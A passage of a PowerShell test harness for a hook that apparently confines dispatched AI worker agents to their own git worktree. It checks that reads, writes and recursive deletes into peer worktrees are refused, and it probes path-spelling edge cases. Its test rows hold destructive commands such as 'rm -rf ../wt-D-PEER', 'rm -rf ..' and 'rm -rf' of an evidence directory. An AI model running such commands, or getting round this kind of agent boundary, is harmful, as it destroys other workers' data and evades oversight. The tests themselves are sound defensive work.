    [pscustomobject]@{ id = 'n7'; kind = 'nr'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = '-'; base = 'ALLOW'; why = 'THE $WT BOUND, STILL STATED (b1s6 item 1): a shell VARIABLE holding the home names no home and no -worktrees component, so no ruling -- 7 and 8 included -- sees it. A non-destructive verb, so the row measures the bound and not any verb rule; it must still ALLOW (h18WtBoundOk)'; text = 'cat $WT/wt-D-PEER/src/file.txt' }
)

$h18SavedProj     = $env:CLAUDE_PROJECT_DIR
$h18SavedDispatch = $env:MISSION_DISPATCH_ID
$h18SavedWorktree = $env:LAM_WORKTREE
$h18SavedCeiling  = $env:GIT_CEILING_DIRECTORIES
$h18Results = New-Object System.Collections.Generic.List[object]
$h18Lines   = New-Object System.Collections.Generic.List[string]
$h18F0Lines = New-Object System.Collections.Generic.List[string]
$h18EdgeLines = New-Object System.Collections.Generic.List[string]
$h18F0 = $false
$h18PredOk = $false
# b1s6 item 1: the shape fixture's own F-0, its rows, and the LAM_WORKTREE value per row key.
$h18ShapeRoot     = Join-Path $h18Root 'shapes'
$h18ShapeF0       = $false
$h18ShapeF0Lines  = New-Object System.Collections.Generic.List[string]
$h18ShapeFacts    = [ordered]@{}
$h18ShapeRows     = New-Object System.Collections.Generic.List[object]
$h18Wts           = @{}
# b1s6 ITEM 2: THE FOUR OWN ROWS THAT ARE RECURSIVE DELETES (o03, o06, o09, o12) carry lwt 'h18own' -- LAM_WORKTREE = the
# own tree, as the runner sets it in deployment. The recursive-delete rule reads the
# worker's own root ONLY from LAM_WORKTREE and CLAUDE_PROJECT_DIR, never from the payload cwd, and these rows run with
# CLAUDE_PROJECT_DIR = the sandbox, so without the anchor they would be REFUSED. Only these four need it: no other row of
# this member is a recursive delete that must allow. H-19 drives the same four deletes with neither anchor pointing at
# the tree and asserts the refusal (its noanchor rows) -- the fail-closed cost, measured there, not hidden here. For
# these rows ruling 8's own home is <T>/project-worktrees, which rulings 1-2 already derive, so the peer rule is unmoved.
$h18Wts['h18own'] = $h18Cwds['own']
try {
    New-Item -ItemType Directory -Path $h18Root -Force | Out-Null
    New-Wp1H18Fixture -Root $h18Root
    # ---- F-0 OF THIS MEMBER: THE FIXTURE'S SHAPE, BEFORE ANY ROW IS TRUSTED. ----------------------
    $f0 = [ordered]@{}
    $f0['project\.git is a DIRECTORY (git init)'] = [System.IO.Directory]::Exists("$h18Tb\project\.git")
    $f0['smoke\.git is a DIRECTORY (git init)'] = [System.IO.Directory]::Exists("$h18Tb\smoke\.git")
    $ownGit = "$h18Tb\project-worktrees\wt-D-OWN\.git"
    $f0['wt-D-OWN\.git is a FILE: gitdir <T>/project/.git/worktrees/wt-D-OWN'] = [System.IO.File]::Exists($ownGit) -and
        (([System.IO.File]::ReadAllText($ownGit)).Trim() -eq "gitdir: $h18Tf/project/.git/worktrees/wt-D-OWN")
    $smokeGit = "$h18Tb\smoke-worktrees\wt-D-OWN\.git"
    $f0['smoke-worktrees\wt-D-OWN\.git is a FILE: gitdir <T>/smoke/.git/worktrees/wt-D-OWN'] = [System.IO.File]::Exists($smokeGit) -and
        (([System.IO.File]::ReadAllText($smokeGit)).Trim() -eq "gitdir: $h18Tf/smoke/.git/worktrees/wt-D-OWN")
    foreach ($w in @('wt-D-OWN', 'wt-D-PEER', 'wt-D-OWN2', 'D-OWN', 'D-PEER3')) {
        $fp = "$h18Tb\project-worktrees\$w\src\file.txt"
        $f0["project-worktrees\$w\src\file.txt reads 'tree $w'"] = [System.IO.File]::Exists($fp) -and ([System.IO.File]::ReadAllText($fp) -eq "tree $w")
    }
    $f0['smoke-worktrees\wt-D-PEER\src\file.txt present'] = [System.IO.File]::Exists("$h18Tb\smoke-worktrees\wt-D-PEER\src\file.txt")
    $f0['no peer or non-wt entry carries a .git'] = (@(@('wt-D-PEER', 'wt-D-OWN2', 'D-OWN', 'D-PEER3') | Where-Object { Test-Path -LiteralPath "$h18Tb\project-worktrees\$_\.git" }).Count -eq 0)
    $f0['subshape\.git is a FILE naming a submodule gitdir'] = [System.IO.File]::Exists("$h18Tb\subshape\.git")
    $noGitAbove = $true
    $walk = $h18Cwds['outside']
    while ($walk) {
        if (Test-Path -LiteralPath (Join-Path $walk '.git')) { $noGitAbove = $false; break }
        $up = Split-Path -Parent $walk
        if (-not $up -or $up -eq $walk) { break }
        $walk = $up
    }
    $f0['outside has NO .git on itself or any ancestor (a cwd outside every repository)'] = $noGitAbove
    $lnkPath = "$h18Tb\project-worktrees\wt-D-OWN\lnk"
    $lnkReparse = (Test-Path -LiteralPath $lnkPath) -and ((([System.IO.File]::GetAttributes($lnkPath)) -band [System.IO.FileAttributes]::ReparsePoint) -ne 0)
    $f0['own\lnk is a JUNCTION and reads the PEER file through it'] = $lnkReparse -and
        ([System.IO.File]::ReadAllText("$lnkPath\src\file.txt") -eq 'tree wt-D-PEER')
    $f0['the fixture is outside the repository'] = -not $h18Tb.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase)
    $protAndParent = @($script:EvidenceProtectedPaths) + @($script:EvidenceParentPaths)
    $dirty = @(@($h18Tf, $h18Cwds['own'], $h18Cwds['ownsrc'], $h18Cwds['outside'], $h18Cwds['smokeown'], $lnkPath) |
               Where-Object { @(Get-EvidencePathHits -Text $_ -Patterns $protAndParent).Count -gt 0 })
    $f0['no fixture root, cwd or project dir carries a protected/parent component (the library matcher)'] = ($dirty.Count -eq 0) -and ($protAndParent.Count -eq 10)
    $h18F0 = (@($f0.Values | Where-Object { -not $_ }).Count -eq 0)
    foreach ($k in $f0.Keys) { [void]$h18F0Lines.Add(('        [{0}] {1}' -f $(if ($f0[$k]) { 'ok  ' } else { 'FAIL' }), $k)) }

    # ---- b1s6 ITEM 1: THE THREE MISSION-ROOT SHAPES, BUILT BY GIT, AND THEIR ROWS. ------------------
    # GIT_CEILING_DIRECTORIES at the temp root for the fixture's git calls; restored in the finally.
    $env:GIT_CEILING_DIRECTORIES = ([System.IO.Path]::GetTempPath()).TrimEnd('\')
    $h18ShapeFacts = New-Wp1H18ShapeFixture -Root $h18ShapeRoot
    $sf0 = [ordered]@{}
    foreach ($sk in $h18ShapeFacts.Keys) {
        $sf = $h18ShapeFacts[$sk]
        $sf0["$sk built by git ($($sf['kind'])): $(if ($sf['ok']) { 'ok' } else { $sf['sentence'] })"] = [bool]$sf['ok']
        if (-not $sf['ok']) { continue }
        $mainF = ([string]$sf['mainLong']).Replace('\', '/')
        if ($sf['kind'] -eq 'alias') {
            $sf0["$sk alias read from the volume: '$($sf['alias'])', the root as given '$($sf['rootGiven'])', the home '$($sf['homeName'])'"] =
                ($sf['homeName'] -eq ($sf['alias'] + '-worktrees')) -and ([string]$sf['rootGiven']).EndsWith('\' + $sf['alias'])
        } else {
            $sf0["$sk side is a LINKED worktree: its .git FILE reads gitdir <main>/.git/worktrees/side"] = ($sf['sideGitFile'] -eq "gitdir: $mainF/.git/worktrees/side")
            $sf0["$sk the home is side-worktrees"] = ($sf['homeName'] -eq 'side-worktrees')
        }
        foreach ($w in @('wt-D-OWN', 'wt-D-PEER')) {
            $sf0["$sk $w .git is git's own FILE: gitdir <long main>/.git/worktrees/$w"] = ($sf["gitFile-$w"] -eq "gitdir: $mainF/.git/worktrees/$w")
            $sf0["$sk git worktree list names $w"] = ([string]$sf['worktreeList']).Contains("/$($sf['homeName'])/$w")
        }
        $sf0["$sk the composed and long spellings name ONE own tree (src/own.txt read through both)"] =
            ([System.IO.File]::ReadAllText((Join-Path $sf['ownGiven'] 'src\own.txt')) -eq "own of $sk") -and
            ([System.IO.File]::ReadAllText((Join-Path $sf['ownLong'] 'src\own.txt')) -eq "own of $sk") -and
            ([System.IO.File]::ReadAllText((Join-Path $sf['ownShort'] 'src\own.txt')) -eq "own of $sk")
        $sf0["$sk the peer's f.txt reads through the composed, long and short spellings"] =
            ([System.IO.File]::ReadAllText((Join-Path $sf['peerGiven'] 'f.txt')) -eq "peer of $sk") -and
            ([System.IO.File]::ReadAllText((Join-Path $sf['peerLong'] 'f.txt')) -eq "peer of $sk") -and
            ([System.IO.File]::ReadAllText((Join-Path $sf['peerShort'] 'f.txt')) -eq "peer of $sk")
        $sfDirty = @(@($sf['ownGiven'], $sf['ownLong'], $sf['ownShort'], $sf['rootLong'], $sf['rootGiven']) |
                     Where-Object { @(Get-EvidencePathHits -Text ([string]$_).Replace('\', '/') -Patterns $protAndParent).Count -gt 0 })
        $sf0["$sk no cwd, tree or root spelling carries a protected/parent component"] = ($sfDirty.Count -eq 0)
    }
    $sf0['all three shapes present (m1a, m1b, m2)'] = (@($h18ShapeFacts.Keys) -join ',') -eq 'm1a,m1b,m2'
    $h18ShapeF0 = (@($sf0.Values | Where-Object { -not $_ }).Count -eq 0)
    foreach ($k in $sf0.Keys) { [void]$h18ShapeF0Lines.Add(('        [{0}] {1}' -f $(if ($sf0[$k]) { 'ok  ' } else { 'FAIL' }), $k)) }
    foreach ($sk in $h18ShapeFacts.Keys) {
        $sf = $h18ShapeFacts[$sk]
        if (-not $sf['ok']) { continue }
        $alt = if ($sf['kind'] -eq 'alias') { 'ownLong' } else { 'ownShort' }
        $peerAlt = if ($sf['kind'] -eq 'alias') { 'peerLong' } else { 'peerShort' }
        $h18Cwds["$sk-own"]     = $sf['ownGiven']
        $h18Cwds["$sk-own-alt"] = $sf[$alt]
        $h18Projs["$sk-own"]       = $sf['ownGiven']
        $h18Projs["$sk-root-long"] = $sf['rootLong']
        $h18Wts["$sk-own"] = $sf['ownGiven']
        foreach ($mode in @('tree', 'wtenv', 'r1')) {
            $proj = switch ($mode) { 'tree' { "$sk-own" } 'wtenv' { "$sk-root-long" } default { 'sandbox' } }
            $lwt  = if ($mode -eq 'wtenv') { "$sk-own" } else { '' }
            $pfx  = "$sk.$mode"
            # deriv: the ruling-7 derivation the refusal must name (the shape's), or ruling 8's name for d5.
            $r7 = if ($sf['kind'] -eq 'alias') { 'main-root-spelling' } else { 'linked-worktree-root' }
            $mk = { param($id, $kind, $tool, $want, $base, $why, $text, $deriv, $cwdKey = "$sk-own")
                [pscustomobject]@{ id = "$pfx.$id"; kind = $kind; tool = $tool; cwd = $cwdKey; proj = $proj; lwt = $lwt; seat = $true; shape = $sk; mode = $mode
                                   deriv = $deriv; want = $want; base = $base; why = $why; text = $text } }
            $rowsNow = @(
                (& $mk 'd1' 'peer' 'shell' 'DENY' 'ALLOW' "M-row: rm -rf a peer from the own root ($($sf['homeName']))" 'rm -rf ../wt-D-PEER' $r7),
                (& $mk 'd2' 'peer' 'shell' 'DENY' 'ALLOW' 'M-row: a redirect into a peer' 'echo x > ../wt-D-PEER/f.txt' $r7),
                (& $mk 'd3' 'peer' 'shell' 'DENY' 'ALLOW' 'M-row: rm -rf .. -- the home itself' 'rm -rf ..' $r7),
                (& $mk 'd4' 'peer' 'shell' 'DENY' 'ALLOW' 'a READ of a peer (verb-independent)' 'cat ../wt-D-PEER/f.txt' $r7),
                (& $mk 'w1' 'peer' 'Write' 'DENY' 'ALLOW' 'M-row: Write into a peer, the home as the runner spelled it' (Join-Path $sf['peerGiven'] 'f.txt') $r7),
                (& $mk 'w2' 'peer' 'Write' 'DENY' 'ALLOW' "Write into a peer, the $peerAlt spelling" (Join-Path $sf[$peerAlt] 'f.txt') $r7),
                (& $mk 'o1' 'own' 'shell' 'ALLOW' 'ALLOW' 'ALLOW CONTROL: a redirect inside the own tree' 'echo x > src/own.txt' ''),
                (& $mk 'o2' 'own' 'Write' 'ALLOW' 'ALLOW' 'ALLOW CONTROL: Write the own tree by its absolute path' (Join-Path $sf['ownGiven'] 'src\own.txt') ''),
                (& $mk 'cd' 'ctl-deny' 'shell' 'DENY' 'DENY' 'DENY CONTROL: a correctly spelled protected path, refused by A1 for both roles' "rm -rf $h18Mr/evidence" ''),
                (& $mk 'ca' 'ctl-allow' 'shell' 'ALLOW' 'ALLOW' 'ALLOW CONTROL: ordinary work naming nothing' 'git status --porcelain' '')
            )
            if ($mode -eq 'r1') {
                $rowsNow += (& $mk 'd5' 'nr' 'shell' '-' 'ALLOW' 'NOT REACHED IN r1 (the new bound): the home NAME behind a computed prefix is seen only through ruling 8, and no anchor places the own tree here' "cat ~/x/$($sf['homeName'])/wt-D-PEER/f.txt" '')
            } else {
                $rowsNow += (& $mk 'd5' 'peer' 'shell' 'DENY' 'ALLOW' "the home NAME behind a computed ~ prefix (ruling 8's name)" "cat ~/x/$($sf['homeName'])/wt-D-PEER/f.txt" 'own-tree-home-name')
            }
            if ($mode -eq 'tree') {
                $rowsNow += (& $mk 'd6' 'peer' 'shell' 'DENY' 'ALLOW' 'the PREFIX-SHARING peer wt-D-OWN2 in this home: own is exact' 'cat ../wt-D-OWN2/f.txt' $r7)
                $rowsNow += (& $mk 'a1' 'peer' 'shell' 'DENY' 'ALLOW' "cwd spelled $($alt): rm -rf a peer" 'rm -rf ../wt-D-PEER' $r7 "$sk-own-alt")
                $rowsNow += (& $mk 'a2' 'peer' 'shell' 'DENY' 'ALLOW' "cwd spelled $($alt): a redirect into a peer" 'echo x > ../wt-D-PEER/f.txt' $r7 "$sk-own-alt")
                $rowsNow += (& $mk 'a3' 'peer' 'shell' 'DENY' 'ALLOW' "cwd spelled $($alt): rm -rf .." 'rm -rf ..' $r7 "$sk-own-alt")
                $rowsNow += (& $mk 'a4' 'peer' 'shell' 'DENY' 'ALLOW' "cwd spelled $($alt): a read of a peer" 'cat ../wt-D-PEER/f.txt' $r7 "$sk-own-alt")
                $rowsNow += (& $mk 'a5' 'own' 'shell' 'ALLOW' 'ALLOW' "cwd spelled $($alt): ALLOW CONTROL inside the own tree" 'echo x > src/own.txt' '' "$sk-own-alt")
            }
            foreach ($row in $rowsNow) { [void]$h18ShapeRows.Add($row) }
        }
    }

    # ---- THE ROWS, THROUGH THE REAL HOOK. -------------------------------------------------------
    $env:MISSION_DISPATCH_ID = $h18Id
    foreach ($r in @(@($h18Rows) + @($h18ShapeRows.ToArray()))) {
        $rowProps = @($r.PSObject.Properties | ForEach-Object { $_.Name })
        $rowSeat  = ($rowProps -contains 'seat') -and [bool]$r.seat
        $rowWt    = if ($rowProps -contains 'lwt') { [string]$r.lwt } else { '' }
        $rowShape = if ($rowProps -contains 'shape') { [string]$r.shape } else { '' }
        $rowDeriv = if ($rowProps -contains 'deriv') { [string]$r.deriv } else { '' }
        $rowMode  = if ($rowProps -contains 'mode') { [string]$r.mode } else { '' }
        $roles = if ($r.kind -eq 'nr') { @('worker') } elseif ($r.kind -eq 'own' -and -not $rowSeat) { @('worker') } else { @('worker', 'seat') }
        $tools = if ($r.tool -ne 'shell') { @($r.tool) } elseif ($r.kind -eq 'nr') { @('Bash') } else { @('Bash', 'PowerShell') }
        foreach ($role in $roles) {
            foreach ($tool in $tools) {
                $proj = $h18Projs[$r.proj]
                $ti = @{}
                if ($r.tool -eq 'shell') { $ti['command'] = $r.text; $recCmd = $r.text }
                else {
                    $ti['file_path'] = $r.text; $recCmd = "$tool $($r.text)"
                    if ($r.tool -eq 'Write') { $ti['content'] = 'x' } else { $ti['old_string'] = 'tree'; $ti['new_string'] = 'TREE' }
                }
                $payload = @{
                    session_id      = $h18Id
                    hook_event_name = 'PreToolUse'
                    tool_name       = $tool
                    tool_input      = $ti
                    cwd             = $h18Cwds[$r.cwd]
                } | ConvertTo-Json -Depth 8 -Compress
                $before = @(Get-Wp1H18Denials -Proj $proj -DispatchId $h18Id)
                $env:CLAUDE_PROJECT_DIR = $proj
                if ($role -eq 'worker') { $env:LAM_DISPATCH = $h18Worker } else { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue }
                # LAM_WORKTREE ONLY WHERE A ROW'S MODE SETS IT; every other row runs with it REMOVED (b1s6 item 1).
                if ($rowWt) { $env:LAM_WORKTREE = $h18Wts[$rowWt] } else { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
                try {
                    $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
                } finally {
                    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
                    Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
                    $env:CLAUDE_PROJECT_DIR = $h18SavedProj
                }
                $after = @(Get-Wp1H18Denials -Proj $proj -DispatchId $h18Id)
                $got = if (($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')) { 'DENY' }
                       elseif (($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')) { 'ALLOW' }
                       else { 'OTHER' }
                $want = if ($r.kind -eq 'nr') { $got } elseif ($role -eq 'worker') { $r.want } else { $r.base }
                $byRule = ($res.stdout -like '*PEER WORKTREE*')
                $ruleWanted = ($role -eq 'worker') -and ($r.want -eq 'DENY') -and ($r.base -eq 'ALLOW')
                $ok = if ($r.kind -eq 'nr') { $got -ne 'OTHER' } else { ($got -eq $want) -and ($byRule -eq $ruleWanted) }
                $newRecs = @($after | Select-Object -Skip $before.Count)
                $recOk = if ($got -eq 'DENY') {
                    ($newRecs.Count -eq 1) -and
                    ([string](Get-EntryField $newRecs[0] 'command' '') -eq $recCmd) -and
                    ([string](Get-EntryField $newRecs[0] 'outcome' '') -eq 'denied') -and
                    ((-not $ruleWanted) -or ([string](Get-EntryField $newRecs[0] 'reason' '') -like "*PEER WORKTREE*dispatched worker '$h18Worker'*"))
                } else { ($newRecs.Count -eq 0) }
                # WHICH RULING DECIDED: a shape row's refusal must come from rulings 7 or 8 -- the
                # recorded reason names b1s6 item 1 and the derivation the row expects -- so a row that rulings
                # 1-6 already refused cannot pass here for the old reason.
                $provOk = $true
                if ($rowDeriv -and ($role -eq 'worker')) {
                    $recReason = if ($newRecs.Count -ge 1) { [string](Get-EntryField $newRecs[0] 'reason' '') } else { '' }
                    $fragment = switch ($rowDeriv) {
                        'main-root-spelling'   { 'is the main repository root under another spelling (an 8.3 alias)' }
                        'linked-worktree-root' { 'is a linked worktree of the main repository' }
                        'own-tree-home'        { "home derived as the directory holding this worker's own" }
                        default                { "home derived as the NAME of the directory holding this worker's own" }
                    }
                    $provOk = ($got -eq 'DENY') -and ($recReason -like '*(b1s6 item 1, *') -and $recReason.Contains($fragment)
                }
                [void]$h18Results.Add([pscustomobject]@{ id = $r.id; kind = $r.kind; role = $role; tool = $tool; got = $got; ok = $ok; recOk = $recOk; shape = $rowShape; mode = $rowMode; deriv = $rowDeriv; provOk = $provOk })
                [void]$h18Lines.Add(('      {0,-4} {1,-6} {2,-10} want={3,-5} got={4,-5} exit={5} rule={6,-5} record={7,-5} {8}   {9}' -f
                    $r.id, $role, $tool, $(if ($r.kind -eq 'nr') { '(nr)' } else { $want }), $got, $res.exit, $byRule, $recOk,
                    $(if ($ok -and $recOk -and $provOk) { 'MATCH  ' } else { 'DIVERGE' }), $(if ($rowDeriv -and $role -eq 'worker') { "$($r.text)   [derivation $rowDeriv named: $provOk]" } else { $r.text })))
            }
        }
        [void]$h18Lines.Add('              ' + $r.why)
    }

    # ---- THE PREDICATE ASKED DIRECTLY, AT THE EDGES. --------------------------------------------
    $env:CLAUDE_PROJECT_DIR = $sandbox
    $e = [ordered]@{}
    $e['e01 main root from own src (a .git FILE)            '] = ((Get-EvidencePeerWorktreeMainRoot -Anchor $h18Cwds['ownsrc']) -eq "$h18Tf/project")
    $e['e02 main root from the main repo (a .git DIRECTORY)'] = ((Get-EvidencePeerWorktreeMainRoot -Anchor "$h18Tb\project\src") -eq "$h18Tf/project")
    $e['e03 a cwd outside every repository derives nothing  '] = ($null -eq (Get-EvidencePeerWorktreeMainRoot -Anchor $h18Cwds['outside']))
    $e['e04 a peer tree with no .git derives nothing         '] = ($null -eq (Get-EvidencePeerWorktreeMainRoot -Anchor "$h18Tb\project-worktrees\wt-D-PEER\src"))
    $e['e05 a submodule-shaped gitdir derives nothing        '] = ($null -eq (Get-EvidencePeerWorktreeMainRoot -Anchor "$h18Tb\subshape"))
    $ctxOwn = Get-EvidencePeerWorktreeContainers -Cwd $h18Cwds['own']
    $e['e06 own cwd derives the home <T>/project-worktrees    '] = (@($ctxOwn.paths) -contains "$h18Tf/project-worktrees")
    $ctxSmoke = Get-EvidencePeerWorktreeContainers -Cwd $h18Cwds['smokeown']
    $e['e07 smoke cwd derives the NAME smoke-worktrees (rl 2)'] = (@($ctxSmoke.names) -contains 'smoke-worktrees') -and (@($ctxSmoke.paths) -contains "$h18Tf/smoke-worktrees")
    # THE LIBRARY ANCHOR, CROSS-CHECKED BY GIT ITSELF: with no project dir and no cwd, the library's own
    # location must still derive <parent of the main checkout>/<its folder name>-worktrees.
    $h18Common = ''
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try { $h18Common = ("$(& git -C $repoRoot rev-parse --path-format=absolute --git-common-dir 2>$null)").Trim() } finally { $ErrorActionPreference = $prevEap }
    $h18LibHome = ''; $h18RealHomeName = ''
    if ($h18Common -match '^(.+)/([^/]+)/\.git$') { $h18RealHomeName = $matches[2] + '-worktrees'; $h18LibHome = $matches[1] + '/' + $h18RealHomeName }
    Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue
    try { $ctxLib = Get-EvidencePeerWorktreeContainers -Cwd '' } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
    $e['e08 the LIBRARY anchor alone derives the real home  '] = ($h18LibHome -ne '') -and (@($ctxLib.paths) -contains $h18LibHome)
    $e['e09 wt-D-OWN2 is a PEER: exact, never a prefix      '] = (Test-EvidencePeerWorktreePath -Text "$h18Tf/project-worktrees/wt-D-OWN2/src/file.txt" -Cwd $h18Cwds['own'] -DispatchId $h18Worker)
    $e['e10 wt-d-own (case) is OWN                           '] = -not (Test-EvidencePeerWorktreePath -Text "$h18Tf/project-worktrees/wt-d-own/src/file.txt" -Cwd $h18Cwds['own'] -DispatchId $h18Worker)
    $e['e11 wt-D-OWN. plus a space (Win32 form) is OWN       '] = -not (Test-EvidencePeerWorktreePath -Text "$h18Tf/project-worktrees/wt-D-OWN. /src/file.txt" -Cwd $h18Cwds['own'] -DispatchId $h18Worker -WholePath)
    $e['e12 the bare id D-OWN is NOT own                     '] = (Test-EvidencePeerWorktreePath -Text "$h18Tf/project-worktrees/D-OWN/src/file.txt" -Cwd $h18Cwds['own'] -DispatchId $h18Worker)
    $e['e13 the home itself is refused                       '] = (Test-EvidencePeerWorktreePath -Text "$h18Tf/project-worktrees" -Cwd $h18Cwds['own'] -DispatchId $h18Worker)
    $e['e14 a sibling merely STARTING with the home name is not'] = -not (Test-EvidencePeerWorktreePath -Text "$h18Tf/project-worktrees-old/wt-D-PEER/src/file.txt" -Cwd $h18Cwds['own'] -DispatchId $h18Worker)
    $e['e15 the ANCESTOR <T> is NOT covered (the finding)    '] = -not (Test-EvidencePeerWorktreePath -Text $h18Tf -Cwd $h18Cwds['own'] -DispatchId $h18Worker)
    $e['e16 textual, no cwd at all: ~/.../wt-D-PEER refused  '] = ($h18RealHomeName -ne '') -and (Test-EvidencePeerWorktreePath -Text ('~/x/' + $h18RealHomeName + '/wt-D-PEER/src') -Cwd '' -DispatchId $h18Worker)
    $e['e17 no dispatch id is no worker: not judged          '] = -not (Test-EvidencePeerWorktreePath -Text "$h18Tf/project-worktrees/wt-D-PEER" -Cwd $h18Cwds['own'] -DispatchId '')
    $e['e18 the segment test is exact, case- and dot-blind   '] = (-not (Test-EvidencePeerWorktreeSegmentIsOwn -Segment 'wt-D-OWN2' -OwnSegment 'wt-D-OWN')) -and
                                                                  (Test-EvidencePeerWorktreeSegmentIsOwn -Segment 'WT-D-OWN.' -OwnSegment 'wt-D-OWN')
    # ---- b1s6 ITEM 1: RULINGS 7 AND 8 ASKED DIRECTLY (LAM_WORKTREE removed unless a line sets it). ----
    Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
    $sA = $h18ShapeFacts['m1a']; $sB = $h18ShapeFacts['m1b']; $sC = $h18ShapeFacts['m2']
    $shapesUp = ($null -ne $sA) -and ($null -ne $sB) -and ($null -ne $sC) -and [bool]$sA['ok'] -and [bool]$sB['ok'] -and [bool]$sC['ok']
    $cmp = { param($p) ConvertTo-EvidencePeerComparablePath -Path ([string]$p) }
    if ($shapesUp) {
        $env:LAM_WORKTREE = $sA['ownGiven']
        try { $or19 = @(Get-EvidenceOwnWorktreeRoots -DispatchId $h18Worker) } finally { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
        $e['e19 rl 8: LAM_WORKTREE gives the own root, composed AND long'] = ($or19 -contains (& $cmp $sA['ownGiven'])) -and ($or19 -contains (& $cmp $sA['ownLong']))
        $env:CLAUDE_PROJECT_DIR = Join-Path $sA['ownGiven'] 'src'
        try { $or20 = @(Get-EvidenceOwnWorktreeRoots -DispatchId $h18Worker) } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
        $e['e20 rl 8: CLAUDE_PROJECT_DIR under the tree walks UP to it'] = ($or20 -contains (& $cmp $sA['ownGiven']))
        $ctx21 = Get-EvidencePeerWorktreeContainers -Cwd $sA['ownGiven'] -DispatchId $h18Worker
        $e['e21 rl 8: the PAYLOAD CWD is no anchor (no own home)  '] = (@($ctx21.ownHomes).Count -eq 0) -and (@($ctx21.ownRoots).Count -eq 0)
        $env:LAM_WORKTREE = $sA['ownGiven']
        try { $or22 = @(Get-EvidenceOwnWorktreeRoots -DispatchId '') } finally { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
        $e['e22 rl 8: no dispatch id derives no own root          '] = ($or22.Count -eq 0)
        $e['e23 rl 7a: MISSIO~1 is missionroot under another spelling'] = ((Get-EvidencePeerWorktreeCandidateRootDerivation -CandidateRoot $sA['rootGiven'] -MainRoots @((& $cmp $sA['mainLong']))) -eq 'main-root-spelling')
        $e['e24 rl 7a: PROJEC~1 is projectroot under another spelling'] = ((Get-EvidencePeerWorktreeCandidateRootDerivation -CandidateRoot $sB['rootGiven'] -MainRoots @((& $cmp $sB['mainLong']))) -eq 'main-root-spelling')
        $e['e25 rl 7b: side is a linked worktree of main            '] = ((Get-EvidencePeerWorktreeCandidateRootDerivation -CandidateRoot $sC['rootGiven'] -MainRoots @((& $cmp $sC['mainLong']))) -eq 'linked-worktree-root')
        $e['e26 rl 7b never walks up (a tree subdirectory is no root)'] = ((Get-EvidencePeerWorktreeCandidateRootDerivation -CandidateRoot (Join-Path $sC['ownGiven'] 'src') -MainRoots @((& $cmp $sC['mainLong']))) -eq '')
        $e['e27 rl 7b: a linked worktree of ANOTHER repo is no root  '] = ((Get-EvidencePeerWorktreeCandidateRootDerivation -CandidateRoot $sC['rootGiven'] -MainRoots @((& $cmp $sA['mainLong']))) -eq '')
        $e['e28 rl 7: a candidate root that does not exist: nothing'] = ((Get-EvidencePeerWorktreeCandidateRootDerivation -CandidateRoot (Join-Path (Split-Path -Parent $sA['mainLong']) 'NOSUCH~1') -MainRoots @((& $cmp $sA['mainLong']))) -eq '')
        $e['e29 rl 7: the home spelled by ITS OWN alias is reached  '] = (Test-EvidencePeerWorktreePath -Text ((Join-Path $sA['peerShort'] 'f.txt').Replace('\', '/')) -Cwd $sA['ownGiven'] -DispatchId $h18Worker)
        $e['e30 rl 7: the ANCESTOR of a derived home is NOT covered '] = -not (Test-EvidencePeerWorktreePath -Text ((Split-Path -Parent $sA['mainLong']).Replace('\', '/')) -Cwd $sA['ownGiven'] -DispatchId $h18Worker)
        # RULING 8 ALONE: a home no git file places under any main root (plain directories), named only by LAM_WORKTREE.
        $plainOwn = Join-Path $h18ShapeRoot 'r8\plain-worktrees\wt-D-OWN'
        New-Item -ItemType Directory -Path (Join-Path $plainOwn 'src') -Force | Out-Null
        New-Item -ItemType Directory -Path (Join-Path $h18ShapeRoot 'r8\plain-worktrees\wt-D-PEER') -Force | Out-Null
        $env:LAM_WORKTREE = $plainOwn
        try { $e31on = (Test-EvidencePeerWorktreePath -Text '../wt-D-PEER/f.txt' -Cwd $plainOwn -DispatchId $h18Worker) } finally { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
        $e31off = (Test-EvidencePeerWorktreePath -Text '../wt-D-PEER/f.txt' -Cwd $plainOwn -DispatchId $h18Worker)
        $e['e31 rl 8 alone: a plain home refused via LAM_WORKTREE only'] = $e31on -and (-not $e31off)
        $env:LAM_WORKTREE = $sA['ownGiven']
        try { $e32 = (Test-EvidencePeerWorktreePath -Text 'cat $WT/wt-D-PEER/f.txt' -Cwd $sA['ownGiven'] -DispatchId $h18Worker) } finally { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
        $e['e32 the $WT bound holds with rulings 7 AND 8 armed      '] = -not $e32
        $hitOld = Get-EvidencePeerWorktreeHit -Text "$h18Tf/project-worktrees/wt-D-PEER/src/file.txt" -Cwd $h18Cwds['own'] -DispatchId $h18Worker
        $hitNew = Get-EvidencePeerWorktreeHit -Text ((Join-Path $sA['peerGiven'] 'f.txt').Replace('\', '/')) -Cwd $sA['ownGiven'] -DispatchId $h18Worker
        $e['e33 a rl 1-6 hit carries no derivation; a rl 7 hit does'] = ($null -ne $hitOld) -and (-not $hitOld.Contains('derivation')) -and ($null -ne $hitNew) -and ($hitNew['derivation'] -eq 'main-root-spelling')
    } else {
        $e['e19-e33 NOT ASKED: a shape fixture was not built (see its F-0)'] = $false
    }
    $h18PredOk = (@($e.Values | Where-Object { -not $_ }).Count -eq 0)
    foreach ($k in $e.Keys) { [void]$h18EdgeLines.Add(('        {0} -> {1}' -f $k, $e[$k])) }
} finally {
    $env:CLAUDE_PROJECT_DIR = $h18SavedProj
    $env:MISSION_DISPATCH_ID = $h18SavedDispatch
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
